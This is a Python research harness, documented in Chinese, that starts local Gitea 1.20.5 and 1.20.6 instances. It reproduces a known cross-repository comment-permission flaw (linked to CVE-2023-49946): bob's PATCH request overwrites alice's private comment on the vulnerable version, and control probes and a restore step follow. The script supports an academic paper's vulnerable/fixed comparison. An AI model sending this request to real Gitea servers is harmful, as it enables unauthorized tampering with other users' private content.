"""
真实 vulnerable/fixed 配对（Gitea 1.20.5 → 1.20.6，"comment permissions"）
=========================================================================

为什么需要这一对
----------------
论文此前全部真实系统证据都落在**正确系统**上，因此只能展示假确证（F1），
展示不了"当真存在授权缺陷时，同一套 E/Y 真值仍能给出真阳性"。审稿人要求
一个真实的 vulnerable/fixed 配对来补上这一侧。

选定的缺陷
----------
Gitea 1.21.1 / 1.20.6 的 SECURITY 修复 "Fix comment permissions"
（#28213 / 回移 #28216）说明了缺陷本身：

> 之前仅用 comment 的 id 定位评论；但请求是针对某个具体仓库的，
> 必须同时校验该 id 属于该仓库，否则可以读到本不该看到的内容。

同一缺陷在 Forgejo 侧有 CVE-2023-49946（"endpoints do not check whether an
object belongs to a repository for which permissions are being checked"）。
即：**路径级权限检查通过、对象级归属检查缺失**——正是本项目讨论的那类
"可达 ≠ 有权"的相邻形态，只是这次它是真的越权。

实验设计（每个版本各一个全新实例）
----------------------------------
1. alice 建**私有**仓库 `alice/secret`，在其中发一个 issue 并写一条带
   `SECRET-COMMENT-MARKER` 的评论（comment id 全局唯一）。
2. bob 建**公开**仓库 `bob/pub`，并在其中发一条自己的评论（合法对照）。
3. 主探针（**写**路径）：`PATCH /api/v1/repos/bob/pub/issues/comments/{alice 的 id}`，
   body 换成 `TAMPERED-BY-BOB`。
   * 1.20.5：路径级检查通过（bob 是 bob/pub 的 admin），对象级归属检查缺失 ⇒
     **评论正文被改写**。Y 不看状态码，而由 **alice 复读**正文是否变成 `TAMPERED-BY-BOB`
     决定（与 `write_path.py` 同一口径）。
   * 1.20.6：404，正文不变 ⇒ 关系不触发。
4. 对照（防止把"端点本来就坏"当发现）：
   * bob 改**自己的**评论 → 两版都成功（端点可用 + 有权）；
   * bob 走**正确路径** `/repos/alice/secret/...` → 两版都拒绝（路径级检查本就在）；
   * carol 借 bob 的公开仓库路径改 alice 的评论 → 两版都拒绝；
   * 匿名 → 两版都拒绝；不存在的 id → 两版都 404；
   * 最后 alice 用自己的权限把正文改回原文（恢复现场）。

E 来自台账（`entitlement.PolicyModel`），Y 来自拥有者复读的正文——
与真实系统主实验、写路径实验同一套定义。

用法:
  python run_cve_pair.py [--version 1.20.5] [--keep]
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import shutil
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from gitea_lab import Client                     # noqa: E402
from entitlement import PolicyModel, classify    # noqa: E402

RESULTS = HERE / "results"
ROOT = Path(os.environ.get("CVE_PAIR_ROOT",
                           r"C:\Users\Administrator\WorkBuddy\cve_pair"))
PASS = "LabPass123!"
USERS = ("alice", "bob", "carol")
PORTS = {"1.20.5": 3331, "1.20.6": 3332}
EXE = {"1.20.5": HERE / "bin" / "gitea-1.20.5.exe",
       "1.20.6": HERE / "bin" / "gitea-1.20.6.exe"}
SUMMARY = Path(r"C:\Users\Administrator\WorkBuddy\.cve_pair_run")
MARK = "SECRET-COMMENT-MARKER"

_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


# --------------------------------------------------------------------------
# 实验台
# --------------------------------------------------------------------------
def write_config(lab: Path, port: int) -> Path:
    cfg = lab / "conf" / "app.ini"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text(
        f"""; 由 run_cve_pair.py 生成
APP_NAME = CVE Pair Lab
RUN_USER = Administrator
RUN_MODE = prod
WORK_PATH = {lab.as_posix()}

[database]
DB_TYPE = sqlite3
PATH = {(lab / 'gitea.db').as_posix()}

[repository]
ROOT = {(lab / 'repos').as_posix()}

[server]
PROTOCOL = http
DOMAIN = 127.0.0.1
HTTP_ADDR = 127.0.0.1
HTTP_PORT = {port}
ROOT_URL = http://127.0.0.1:{port}/
DISABLE_SSH = true
START_SSH_SERVER = false
OFFLINE_MODE = true
LFS_START_SERVER = false

[service]
DISABLE_REGISTRATION = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = false
DEFAULT_USER_IS_RESTRICTED = false
REQUIRE_SIGNIN_VIEW = false

[mailer]
ENABLED = false

[session]
PROVIDER = file

[log]
MODE = console
LEVEL = warn
ROOT_PATH = {(lab / 'log').as_posix()}

[security]
INSTALL_LOCK = true
PASSWORD_HASH_ALGO = pbkdf2

[cron]
ENABLED = false
""",
        encoding="utf-8")
    return cfg


def run_cli(exe: Path, lab: Path, cfg: Path, args: list[str],
            timeout: int = 240) -> tuple[int, str]:
    env = dict(os.environ, GITEA_WORK_DIR=str(lab))
    p = subprocess.run([str(exe), *args, "--config", str(cfg)],
                       cwd=str(lab), env=env, capture_output=True, timeout=timeout)
    out = (p.stdout or b"").decode("utf-8", "replace") + \
          (p.stderr or b"").decode("utf-8", "replace")
    return p.returncode, out


def port_free(port: int) -> bool:
    with socket.socket() as s:
        s.settimeout(1.0)
        return s.connect_ex(("127.0.0.1", port)) != 0


class Server:
    def __init__(self, exe: Path, lab: Path, cfg: Path, port: int):
        self.exe, self.lab, self.cfg, self.port = exe, lab, cfg, port
        self.proc: subprocess.Popen | None = None
        self.ready_ms: int | None = None

    def __enter__(self):
        if not port_free(self.port):
            raise RuntimeError(f"端口 {self.port} 已被占用，请先清理残留进程")
        (self.lab / "log").mkdir(parents=True, exist_ok=True)
        out = open(self.lab / "log" / "server.out", "wb")   # noqa: SIM115
        env = dict(os.environ, GITEA_WORK_DIR=str(self.lab))
        self.proc = subprocess.Popen(
            [str(self.exe), "web", "--config", str(self.cfg)],
            cwd=str(self.lab), env=env, stdout=out, stderr=subprocess.STDOUT)
        t0 = time.time()
        base = f"http://127.0.0.1:{self.port}"
        c = Client(base=base)
        while time.time() - t0 < 180:
            if self.proc.poll() is not None:
                tail = (self.lab / "log" / "server.out").read_text(
                    encoding="utf-8", errors="replace")[-2000:]
                raise RuntimeError(f"服务提前退出\n{tail}")
            st, _ = c.get("/api/v1/version", timeout=3)
            if st == 200:
                self.ready_ms = int((time.time() - t0) * 1000)
                return self
            time.sleep(0.7)
        raise RuntimeError("服务在 180s 内未就绪")

    def __exit__(self, *exc):
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=20)
            except subprocess.TimeoutExpired:
                self.proc.kill()
        return False


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


# --------------------------------------------------------------------------
# setup + probes
# --------------------------------------------------------------------------
def setup(base: str) -> dict:
    """建 alice/secret（私有）、bob/pub（公开）与两条评论。返回 id 台账。"""
    alice = Client(base, "alice", PASS, "alice")
    bob = Client(base, "bob", PASS, "bob")

    st, r = alice.post("/api/v1/user/repos", {
        "name": "secret", "private": True, "auto_init": True,
        "description": "private object under test"})
    if st != 201:
        raise RuntimeError(f"建私有仓库失败 {st}: {r}")
    st, r = bob.post("/api/v1/user/repos", {
        "name": "pub", "private": False, "auto_init": True,
        "description": "bob's own public repository"})
    if st != 201:
        raise RuntimeError(f"建公开仓库失败 {st}: {r}")

    st, iss = alice.post("/api/v1/repos/alice/secret/issues",
                         {"title": "private issue"})
    if st != 201:
        raise RuntimeError(f"建 issue 失败 {st}: {iss}")
    original = f"{MARK}-ORIGINAL"
    st, com = alice.post(
        f"/api/v1/repos/alice/secret/issues/{iss['number']}/comments",
        {"body": original})
    if st != 201:
        raise RuntimeError(f"建评论失败 {st}: {com}")

    st, b_iss = bob.post("/api/v1/repos/bob/pub/issues", {"title": "bob issue"})
    if st != 201:
        raise RuntimeError(f"建 bob issue 失败 {st}: {b_iss}")
    st, b_com = bob.post(
        f"/api/v1/repos/bob/pub/issues/{b_iss['number']}/comments",
        {"body": "BOB-OWN-COMMENT"})
    if st != 201:
        raise RuntimeError(f"建 bob 评论失败 {st}: {b_com}")

    return {"comment_alice": com["id"], "comment_bob": b_com["id"],
            "issue_alice": iss["number"], "original_body": original}


def _body(base: str, user: str, owner: str, repo: str, cid: int) -> tuple[int, str]:
    """以 `user` 身份读评论正文（用于状态真值，不看写入方的状态码）。"""
    c = Client(base, user, PASS, user)
    st, body = c.get(f"/api/v1/repos/{owner}/{repo}/issues/comments/{cid}")
    if isinstance(body, dict):
        return st, str(body.get("body") or "")
    return st, ""


def probes(base: str, ids: dict) -> dict:
    alice = Client(base, "alice", PASS, "alice")
    bob = Client(base, "bob", PASS, "bob")
    carol = Client(base, "carol", PASS, "carol")
    anon = Client(base, label="anonymous")
    cid, bid = ids["comment_alice"], ids["comment_bob"]
    bob_mark, carol_mark = "TAMPERED-BY-BOB", "TAMPERED-BY-CAROL"

    rows = []

    def patch(label, client, path, body, note=""):
        st, resp = client.patch(path, body)
        rows.append({"label": label, "as": client.label, "method": "PATCH",
                     "path": path, "body_sent": body.get("body"),
                     "status": st, "note": note})

    # 1. 端点可用且有权：bob 改自己的评论
    patch("own_comment", bob, f"/api/v1/repos/bob/pub/issues/comments/{bid}",
          {"body": "BOB-OWN-COMMENT-EDITED"}, "control: entitled")

    # 2. 路径级检查本就在：bob 走正确路径改 alice 的私有评论
    patch("correct_path_private_repo", bob,
          f"/api/v1/repos/alice/secret/issues/comments/{cid}",
          {"body": bob_mark}, "control: path-level check")

    # 3. 主探针：有权路径 + 属于 alice 私有仓库的对象 id
    patch("cross_repo_object_id", bob,
          f"/api/v1/repos/bob/pub/issues/comments/{cid}",
          {"body": bob_mark}, "MAIN")

    # 4. 另一个无权者（carol 无任何仓库）
    patch("cross_repo_third_user", carol,
          f"/api/v1/repos/bob/pub/issues/comments/{cid}",
          {"body": carol_mark}, "control: third user")

    # 5. 匿名
    patch("anonymous", anon, f"/api/v1/repos/bob/pub/issues/comments/{cid}",
          {"body": "TAMPERED-ANON"}, "control: unauthenticated")

    # 6. 不存在的 id
    patch("absent_id", bob, "/api/v1/repos/bob/pub/issues/comments/99999999",
          {"body": bob_mark}, "control: absent id")

    # ---- 状态真值：拥有者复读（谁写的、返回什么状态码都不参与判定） ----
    st_a, body_a = _body(base, "alice", "alice", "secret", cid)
    state = {"reader": "alice", "path": f"/api/v1/repos/alice/secret/issues/comments/{cid}",
             "status": st_a, "body": body_a,
             "equals_original": body_a == ids["original_body"],
             "contains_bob_mark": bob_mark in body_a,
             "contains_carol_mark": carol_mark in body_a}

    # ---- 恢复：alice 用自己的权限把正文改回原文 ----
    st_r, _ = alice.patch(f"/api/v1/repos/alice/secret/issues/comments/{cid}",
                          {"body": ids["original_body"]})
    st_v, body_v = _body(base, "alice", "alice", "secret", cid)
    restore = {"patch_status": st_r, "verify_status": st_v,
               "restored": body_v == ids["original_body"]}

    return {"writes": rows, "state": state, "restore": restore,
            "bob_mark": bob_mark, "carol_mark": carol_mark}


def run_one(version: str, keep: bool) -> dict:
    exe = EXE[version]
    port = PORTS[version]
    if not exe.exists():
        raise SystemExit(f"缺少二进制 {exe}")
    digest = sha256(exe)

    # 每次全新目录（不删任何旧数据）
    lab = ROOT / f"gitea-{version}-{int(time.time())}"
    lab.mkdir(parents=True, exist_ok=True)
    cfg = write_config(lab, port)

    rc, out = run_cli(exe, lab, cfg, ["migrate"])
    if rc != 0:
        raise RuntimeError(f"migrate 失败 rc={rc}\n{out[-1500:]}")
    for u in USERS:
        rc, out = run_cli(exe, lab, cfg,
                          ["admin", "user", "create", "--username", u,
                           "--password", PASS, "--email", f"{u}@lab.local",
                           "--must-change-password=false"])
        if rc != 0 and "already exists" not in out:
            raise RuntimeError(f"建用户 {u} 失败 rc={rc}\n{out[-800:]}")

    base = f"http://127.0.0.1:{port}"
    with Server(exe, lab, cfg, port) as srv:
        ids = setup(base)
        pr = probes(base, ids)
        ready = srv.ready_ms

    # ---- E 来自台账，不看任何探针响应 ----
    pm = PolicyModel()
    pm.add_repo("alice/secret", "alice", private=True,
                source="setup: POST /user/repos (alice, private=true)")
    pm.add_repo("bob/pub", "bob", private=False,
                source="setup: POST /user/repos (bob, private=false)")
    e_path = pm.expected("bob/pub", "bob", "write").as_dict()
    e_obj = pm.expected("alice/secret", "bob", "write").as_dict()
    e_third = pm.expected("alice/secret", "carol", "write").as_dict()

    state = pr["state"]
    y_allow = bool(state["contains_bob_mark"])   # 状态真值，不看写入状态码
    alarm = y_allow
    verdict = classify(e_obj["expected_entitlement"], y_allow,
                       alarm=alarm, promotion=alarm)
    main_write = next(r for r in pr["writes"] if r["label"] == "cross_repo_object_id")
    run = {
        "version": version,
        "exe": exe.name,
        "sha256": digest,
        "port": port,
        "lab": str(lab),
        "ready_ms": ready,
        "marker": MARK,
        "ids": ids,
        "ledger": {"bob_writes_bob_pub": e_path, "bob_writes_alice_secret": e_obj,
                   "carol_writes_alice_secret": e_third},
        "probes": pr["writes"],
        "state": state,
        "restore": pr["restore"],
        "main": {"subject": "bob", "object_repo": "alice/secret",
                 "requested_path_repo": "bob/pub", "comment_id": ids["comment_alice"],
                 "write_status": main_write["status"], "body_sent": main_write["body_sent"],
                 "E_object": e_obj["expected_entitlement"],
                 "Y_allow": y_allow, "alarm": alarm, **verdict},
    }
    if not keep:
        shutil.rmtree(lab, ignore_errors=True)
    return run


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--version", choices=sorted(EXE), action="append")
    ap.add_argument("--keep", action="store_true", help="保留实例目录以便复查")
    a = ap.parse_args()
    versions = a.version or ["1.20.5", "1.20.6"]

    RESULTS.mkdir(parents=True, exist_ok=True)
    runs = []
    for v in versions:
        print(f"\n=== Gitea {v} ===")
        r = run_one(v, a.keep)
        m = r["main"]
        print(f"  ready={r['ready_ms']}ms  write_status={m['write_status']}"
              f"  E={m['E_object']}  Y(state)={m['Y_allow']}  -> {m['category']}")
        for p in r["probes"]:
            print(f"    {p['label']:28s} {p['status']:>3}  body={p['body_sent']}")
        s = r["state"]
        print(f"    owner re-read: body={s['body'][:40]!r}  "
              f"equals_original={s['equals_original']}  bob={s['contains_bob_mark']}"
              f"  carol={s['contains_carol_mark']}  restore={r['restore']['restored']}")
        runs.append(r)

    out = RESULTS / "cve_pair.json"
    prev = {}
    if out.exists():
        try:
            prev = json.loads(out.read_text(encoding="utf-8"))
        except Exception:                                          # noqa: BLE001
            prev = {}
    merged = {r["version"]: r for r in (prev.get("runs") or [])}
    merged.update({r["version"]: r for r in runs})
    doc = {"family": "Gitea comment permissions (1.21.1/1.20.6 SECURITY fix; "
                     "Forgejo CVE-2023-49946 for the same defect)",
           "generated_by": "run_cve_pair.py",
           "runs": [merged[k] for k in sorted(merged)]}
    out.write_text(json.dumps(doc, ensure_ascii=False, indent=1), encoding="utf-8")
    print(f"\n写出 {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
